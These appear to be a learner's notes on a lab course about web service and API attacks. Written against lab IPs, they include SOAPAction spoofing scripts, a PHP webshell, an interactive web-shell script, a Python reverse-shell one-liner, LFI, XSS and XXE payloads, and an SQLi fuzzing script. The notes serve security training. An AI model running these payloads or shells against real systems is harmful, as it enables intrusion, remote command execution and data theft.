# Web Service & API Attacks

1. [Intro](#intro)
1. [Web Service Attacks](#web-service-attacks)
1. [API Attacks](#api-attacks)
1. [Skills Assessment](#skills-assessment)

## Intro

* Web services enable apps to communicate with each other, provides interoperability & extensibility

* API - application programming interface - set of rules that enables data transmission between software

* Web services are a type of API, but the opposite may not be always true; and web services require network connection, while APIs can be offline too

* Web services usually use SOAP (Simple Object Access Protocol), and in XML format; while APIs commonly use [XML-RPC](http://xmlrpc.com/spec.md), [JSON-RPC](https://www.jsonrpc.org/specification), SOAP, and REST (usually in JSON format)

* WSDL (Web Services Description Language):

  * XML file exposed by web services to inform clients of provided services/methods

  * We can try to find a WSDL file through directory/parameter fuzzing:

    ```sh
    # suppose SOAP service is running on port 3002
    dirb http://10.10.150.160:3002
    # uses the common wordlist
    # we get the /wsdl file

    curl http://10.10.150.160:3002
    # this gives an empty response

    # we will need to check with parameter fuzzing
    ffuf -w "/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://10.10.150.160:3002/wsdl?FUZZ' -fs 0 -mc 200
    # -fs 0 to filter out empty response
    # -mc 200 matches HTTP 200
    
    # this shows wsdl is valid parameter

    curl http://10.10.150.160:3002/wsdl?wsdl
    ```
  
  * WSDL files can be found in other forms like ```/example.wsdl```, ```?wsdl```, ```/example.disco```, ```?disco```, etc.

  * WSDL file layout has the following elements (with respect to version 1.0):

    * Definition - root element; in this, web service name, namespaces and service elements are defined
    * Data types - data types used in exchanged messages
    * Messages - defines input/output operations supported by web service
    * Operation - defines available SOAP actions alongside encoding of each message
    * Port type - defines web service, available operations & exchanged messages
    * Binding - binds operation to a port type
    * Service - client makes call to web service through service name mentioned in this tag

## Web Service Attacks

* SOAPAction Spoofing:

  * If a web service considers only SOAPAction attribute (additional HTTP header containing operation name) to determine the operation, it can be vulnerable to SOAPAction spoofing

  * For example, from the WSDL file of the given SOAP web service, we have a SOAPAction operation called 'ExecuteCommand':

    ```xml
    <wsdl:operation name="ExecuteCommand">
    <soap:operation soapAction="ExecuteCommand" style="document"/>
    ```
  
  * Parameters for this operation:

    ```xml
    <s:element name="ExecuteCommandRequest">
    <s:complexType>
    <s:sequence>
    <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
    </s:sequence>
    </s:complexType>
    </s:element>
    ```
  
  * As we have a 'cmd' parameter, we can create a script 'client.py' to issue requests and try to force SOAP service execute a command:

    ```py
    import requests

    payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

    print(requests.post("http://10.129.102.38:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
    ```

    ```sh
    python3 client.py
    # this gives an error saying it is allowed only in internal networks
    ```
  
  * Modified script for spoofing attack; here we specify 'LoginRequest' in ```<soap:Body>``` and blocked operation is in SOAPAction header:

    ```py
    import requests
    
    payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
    
    print(requests.post("http://10.129.102.38:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
    ```

    ```sh
    python3 client_soapaction_spoofing.py
    # this works
    ```
  
  * For executing multiple commands via SOAPAction spoofing:

    ```py
    import requests

    while True:
        cmd = input("$ ")
        payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
        print(requests.post("http://10.129.102.38:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
    ```

* Command injection:

  * For given example, the web service provides a ping functionality at '/ping-server.php/ping'

  * From given source code, the 'ping' function takes 2 args - the IP and number of packets; request would look like <http://10.129.66.86:3003/ping-server.php/ping/10.10.65.70/3>

  * To confirm the web server is sending ping requests, we can run ```sudo tcpdump -i tun0 icmp```, and we will see ICMP packets in terminal

  * We can only give a number between 1 to 4 for number of packets

  * Due to the way functions like ```escapeshellarg()```, ```shell_exec()``` and ```call_user_func_array()``` are used in source code, we could get command injection by issuing a request such as ```/ping-server.php/system/ls``` instead of the expected ```ping-server.php/ping/www.example.com/2```

* ```xmlrpc.php``` in WordPress can also be used for WordPress attacks; [```system.listMethods```](https://codex.wordpress.org/XML-RPC/system.listMethods) shows list of available methods, from which we can see if certain methods that can be exploited, such as ```pingback.ping```, are allowed or not

## API Attacks

* Information disclosure:

  * Given an API, we can start by parameter fuzzing:

    ```shell
    ffuf -w "/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://10.129.66.86:3003/?FUZZ=test_value'
    # identify word size to be filtered after a few requests

    ffuf -w "/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://10.129.66.86:3003/?FUZZ=test_value' -fs 19
    ```
  
  * In this example, 'id' parameter name with a test value '1' gives us a response:

    ```sh
    curl http://10.129.66.86:3003/?id=1
    ```
  
  * We can create a script to retrieve all info from API for values of 'id' from 1-10000, and filter for responses with 'position' keyword to identify valid responses:

    ```py
    import requests, sys

    def brute():
        try:
            value = range(10000)
            for val in value:
                url = sys.argv[1]
                r = requests.get(url + '/?id='+str(val))
                if "position" in r.text:
                    print("Number found!", val)
                    print(r.text)
        except IndexError:
            print("Enter a URL E.g.: http://10.129.66.86:3003/")

    brute()
    ```
  
  * If there is a rate limit in place, we can try to bypass it using headers such as ```X-Forwarded-For``` and ```X-Forwarded-IP```, or using proxies

  * While parameter fuzzing, we should also try SQLi payloads as values for parameters

* Arbitrary file upload:

  * For testing file upload functionality, we can check with a simple PHP webshell, which once uploaded, allows us to execute commands using the 'cmd' parameter:

    ```php
    <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
    ```
  
  * For the given app, file upload is done via a POST request to '/api/upload', and we can go for any file extension

  * We can use a Python script to get a shell, leveraging the uploaded 'backdoor.php' file:

    ```py
    import argparse, time, requests, os
    # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)

    parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs")
    # generates a variable called parser and uses argparse to create a description

    parser.add_argument("-t", "--target", help="Specify the target host E.g. http://10.129.50.65:3001/uploads/backdoor.php", required=True)
    # specifies flags such as -t for a target with a help and required option being true

    parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload")

    parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes")

    args = parser.parse_args()
    # defines args as a variable holding the values of the above arguments so we can do args.option for example.

    if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
        parser.print_help() # shows help menu
    elif args.target and args.payload: # elif (if they both have values do some action)
        print(requests.get(args.target+"/?cmd="+args.payload).text) 
        # sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
    if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
        os.system("clear") 
        # clear the screen (linux)
        while True:
            try:
                cmd = input("$ ")
                # defines a cmd variable for an input() function which our user will enter
                print(requests.get(args.target+"/?cmd="+cmd).text)
                # same as above except with our input() function value
                time.sleep(0.3)
                # waits 0.3 seconds during each request
            except requests.exceptions.InvalidSchema: # error handling
                print("Invalid URL Schema: http:// or https://")
            except requests.exceptions.ConnectionError: # error handling
                print("URL is invalid")
    ```
  
    ```sh
    python3 web_shell.py -t http://10.129.50.65:3001/uploads/backdoor.php -o yes

    # we get command execution

    # to get reverse shell, setup listener and run the below command in RCE
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.80.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
    ```

* Local file inclusion:

  * For given API, we can start by endpoint fuzzing to identify any valid endpoints:

    ```sh
    ffuf -w "/usr/share/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://10.129.16.41:3000/api/FUZZ'
    ```
  
  * We get a valid API endpoint '/api/download':

    ```sh
    curl http://10.129.16.41:3000/api/download
    # we get JSON response
    # says to input filename via /download/<filename>

    # instead of specifying filename, we can use LFI payloads
    curl "http://10.129.16.41:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
    # this works
    # we can fuzz using LFI payloads to check further
    ```

* Cross-Site Scripting:

  * XSS vulns allow attackers to execute JS code within target browser

  * For given API, if we send a request to '/api/download/test_value', we get the message 'test_value not found'

  * In place of 'test_value', we can try for common XSS payloads:

    ```js
    <script>alert(document.domain)</script>
    ```
  
  * The API submits the encoded payload, so we need to submit a URL-encoded payload:

    ```js
    %3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    ```
  
  * This code gets executed, which means API is vulnerable to XSS attacks

* Server-Side Request Forgery:

  * Interacting with given API service shows we need a 'ID' parameter:

    ```sh
    curl http://10.129.155.60:3000/api/userinfo
    ```
  
  * To check for SSRF vulns, we can setup a listener using ```nc -nvlp 4444``` and specify our URL as value of 'id':

    ```sh
    curl "http://10.129.155.60:3000/api/userinfo?id=http://10.10.60.45:4444"
    # this does not work

    # we can try a base64-encoded payload

    echo "http://10.10.60.45:4444" | tr -d '\n' | base64

    curl "http://10.129.155.60:3000/api/userinfo?id=<base64-payload>"
    # we can see a connection made to our listener
    # we can check with other type of encodings
    ```

* Regular Expression Denial of Service:

  * For APIs matching input with regex on server side, we can submit crafted payloads to increase evaluation time, resulting in ReDoS attacks

  * The given API service accepts a parameter 'email':

    ```sh
    curl "http://10.129.202.133:3000/api/check-email?email=test"
    # json response with regex value and 'success' set to false
    ```
  
  * Interacting with it gives us a regex ```/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/``` - we can use tools such as [regex101](https://regex101.com/) and [regulex](https://jex.im/regulex) to understand regex

  * The way the regex is structured from the visualization on ```regulex```, we can see the 2nd & 3rd part of regex doing bad iterative checks

  * If we submit a long payload like ```jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555.```, the API takes a lot of time and longer payloads increase evaluation time

* XML External Entity injection:

  * XXE injection occurs when malicious XML data can be injected as user input

  * For given API service, if we intercept the login attempt in Burp Suite, we can see XML data in the POST request

  * Based on XML data seen above, we can start by defining a DOCTYPE, in which a DTD (external, pointing to attacker machine) can be included:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://10.10.15.60:4444"> ]>
    <root>
    <email>test@test.com</email>
    <password>P@ssw0rd123</password>
    </root>
    ```
  
  * We can setup a listener using ```nc -nvlp 4444``` and attempt to use the crafted payload:

    ```sh
    curl -X POST http://10.129.202.133:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://10.10.15.60:4444"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
    # this does not work because the external entity has not been used yet

    curl -X POST http://10.129.202.133:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://10.10.15.60:4444"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
    # a connection is made to listener
    ```

## Skills Assessment

* We have a WSDL file for a SOAP service at <http://10.129.202.133:3002/wsdl?wsdl>

* From this, we can see 'username' and 'password' fields defined under the 'LoginRequest' type

* We also have a ```SOAPAction``` named 'Login' defined - we can try to do SOAPAction spoofing here

* Similar to the example above for 'ExecuteCommand' SOAPAction, we can craft a payload for the SOAP request for 'Login':

  ```xml
  <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>admin</username><password>test</password></LoginRequest></soap:Body></soap:Envelope>
  ```

* It is given that there is an SQLi vulnerability - this needs to be identified through SOAP messages. As we have 2 fields here - username & password - we can inject our SQLi payload there itself.

* We can use a script to automate the above process:

  ```py
  import requests
  import sys
  import os.path

  if (len(sys.argv) == 2) and (os.path.isfile(sys.argv[1])):
    f_payloads = sys.argv[1]
  else:
    print("[!] Please check wordlist")
    print("[-] Usage: python3 {} /path/to/sqli/payload/wordlist".format(sys.argv[0]))
    sys.exit()

  payloads = []
  with open(f_payloads) as fh:
    for line in fh:
      payloads.append(line.rstrip('\n'))

  for _p in payloads:
    print("[-] Checking SQLi against payload {}".format(_p))
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>{_p}</username><password>{_p}</password></LoginRequest></soap:Body></soap:Envelope>'
    try:
      res = requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'}, timeout=1)
      # ignoring multiple line responses to filter out errors
      if '\n' not in res.text:
        print(res.text)
    except requests.Timeout:
      print("[-] Timeout")
      pass
  ```

  ```sh
  python3 soaplogin.py /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt
  ```

* From the script, we can see that we get a correct response with the flag using 2 payloads - ```admin' or '1'='1``` or ```admin'/*``` - both of them can be found in above wordlist
